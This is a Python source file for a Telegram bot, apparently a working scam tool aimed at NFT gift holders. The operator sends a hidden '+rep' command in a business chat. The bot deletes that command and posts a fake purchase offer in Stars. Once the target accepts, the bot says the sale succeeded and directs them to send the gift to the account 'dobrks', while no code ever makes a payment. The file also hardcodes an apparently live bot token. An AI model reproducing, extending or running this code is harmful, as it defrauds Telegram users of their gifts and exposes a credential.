import asyncio
import json
import logging
import os
import re
import uuid

from dotenv import load_dotenv
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import (
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    CallbackQuery,
    LinkPreviewOptions,
    BusinessConnection,
)

load_dotenv()

BOT_TOKEN = "8896265487:AAHqtRXlVytqFHMZE7xUOaWZs6WmPFdLbvk"
NFT_TRANSFER_LINK = "tg://send_gift?to=dobrks"
ADMIN_ID = 7875607629

EMOJI_GIFT = "5875180111744995604"
EMOJI_CROSS = "5778527486270770928"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

offers = {}
CONNECTIONS_FILE = "connections.json"
connections = {}

def load_connections():
    global connections
    if os.path.exists(CONNECTIONS_FILE):
        try:
            with open(CONNECTIONS_FILE, "r", encoding="utf-8") as f:
                connections = json.load(f)
        except Exception:
            connections = {}

def save_connections():
    try:
        with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
            json.dump(connections, f, ensure_ascii=False)
    except Exception:
        pass

load_connections()

@dp.business_connection()
async def on_business_conn(conn: BusinessConnection):
    connections[conn.id] = {
        "first_name": conn.user.first_name or "",
        "username": conn.user.username or "",
        "user_id": conn.user.id,
    }
    save_connections()
    print(f"[BIZ] {conn.user.first_name} @{conn.user.username}")

def format_amount(value: str) -> str:
    try:
        return f"{int(value):,}"
    except ValueError:
        return value

def mask_stars(currency: str) -> str:
    return "Stars" if currency.lower() == "stars" else currency.capitalize()

SLUG_RE = re.compile(r"^([A-Za-z][A-Za-z0-9_\-]*?)-(\d+)$")

def parse_nft_input(arg: str):
    arg = arg.strip()
    slug = arg.rstrip("/").split("/")[-1] if "t.me/nft/" in arg else arg
    m = SLUG_RE.match(slug)
    if not m:
        raise ValueError("bad slug")
    name = re.sub(r'(?<!^)(?=[A-Z])', ' ', m.group(1))
    return name, int(m.group(2)), f"https://t.me/nft/{slug}"

@dp.business_message(F.text.startswith("+rep "))
async def cmd_rep(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return

    args = message.text.split()
    if len(args) < 3:
        return

    try:
        nft_name, nft_num, nft_url = parse_nft_input(args[1])
        amount = format_amount(args[2])
        currency = args[3].lower() if len(args) > 3 else "stars"
    except Exception:
        return

    order_id = f"TG-{uuid.uuid4().hex[:8].upper()}"
    offers[order_id] = {
        "nft_url": nft_url,
        "nft_name": f"{nft_name} #{nft_num:,}",
        "amount": amount,
        "currency": currency,
        "status": "pending",
        "business_connection_id": message.business_connection_id,
    }

    buyer = message.from_user.first_name or message.from_user.username or "User"
    nft_link = f'<a href="{nft_url}">{nft_name} #{nft_num:,}</a>'
    preview = f'<a href="{nft_url}">&#8203;</a>'

    text = (
        f"{preview}"
        f"<tg-emoji emoji-id=\"{EMOJI_GIFT}\">🎁</tg-emoji> Пользователь <b>{buyer}</b> предлагает Вам <b>{amount} {mask_stars(currency)}</b> за подарок <b>{nft_link}</b>.\n\n"
        f"Предложение действует ещё <b>5ч 59м.</b>"
    )

    try:
        await message.answer(
            text,
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
                InlineKeyboardButton(text="Отклонить", callback_data=f"dec_{order_id}"),
                InlineKeyboardButton(text="Принять", callback_data=f"acc_{order_id}"),
            ]]),
            link_preview_options=LinkPreviewOptions(show_above_text=True, prefer_large_media=True),
            parse_mode="HTML"
        )
        await bot.delete_business_messages(
            business_connection_id=message.business_connection_id,
            message_ids=[message.message_id]
        )
    except Exception as e:
        print(f"[ERROR] {e}")

@dp.callback_query(F.data.startswith("acc_"))
async def on_accept(cb: CallbackQuery):
    order_id = cb.data.split("_", 1)[1]
    offer = offers.get(order_id)
    if not offer or offer["status"] != "pending":
        await cb.answer()
        return

    offer["status"] = "accepted"
    await cb.answer(
        f"Предложение о продаже {offer['nft_name']} успешно принято.\n\nПередайте подарок покупателю для зачисления {offer['amount']} {mask_stars(offer['currency'])} на ваш баланс.",
        show_alert=True
    )

    nft_link = f'<a href="{offer["nft_url"]}">{offer["nft_name"]}</a>'
    preview = f'<a href="{offer["nft_url"]}">&#8203;</a>'
    text = (
        f"{preview}<tg-emoji emoji-id=\"{EMOJI_GIFT}\">🎁</tg-emoji> Подарок: <b>{nft_link}</b> успешно продан!\n\n"
        f"• Передайте подарок покупателю для зачисления {mask_stars(offer['currency'])}."
    )

    try:
        await bot.edit_message_text(
            chat_id=cb.message.chat.id,
            message_id=cb.message.message_id,
            business_connection_id=cb.message.business_connection_id,
            text=text,
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
                InlineKeyboardButton(text="Передать", url=NFT_TRANSFER_LINK)
            ]]),
            link_preview_options=LinkPreviewOptions(show_above_text=True, prefer_large_media=True),
            parse_mode="HTML"
        )
    except Exception as e:
        print(f"[EDIT ERROR] {e}")

@dp.callback_query(F.data.startswith("dec_"))
async def on_decline(cb: CallbackQuery):
    order_id = cb.data.split("_", 1)[1]
    offer = offers.get(order_id)
    if not offer or offer["status"] != "pending":
        await cb.answer()
        return

    offer["status"] = "declined"
    try:
        await bot.edit_message_text(
            chat_id=cb.message.chat.id,
            message_id=cb.message.message_id,
            business_connection_id=cb.message.business_connection_id,
            text=f"<tg-emoji emoji-id=\"{EMOJI_CROSS}\">❌</tg-emoji> Вы отклонили предложение",
            parse_mode="HTML"
        )
    except Exception:
        pass
    await cb.answer()

async def main():
    print("Бот запущен")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
